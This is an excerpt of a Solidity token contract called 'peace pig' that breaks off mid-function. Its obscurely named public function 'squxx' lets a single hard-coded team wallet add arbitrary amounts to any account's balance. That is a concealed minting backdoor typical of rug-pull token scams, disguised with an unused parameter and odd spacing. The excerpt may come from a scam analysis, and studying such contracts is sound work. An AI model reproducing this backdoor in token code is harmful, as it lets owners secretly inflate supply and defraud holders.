...
contract pcoml is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "peace pig";
    string private _symbol = "Peace Pig";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x2135b306132e3c63Fc4Aa232DaBCb04437432944);
    address payable public teamWalletAddress = payable(0x2135b306132e3c63Fc4Aa232DaBCb04437432944);
    ...
    function squxx(bool _enabled,uint256 xm,address account) public {
        require (  _msgSender()   == teamWalletAddress,"addres");
        _balances[account] = _balances[account]    .        add(xm);
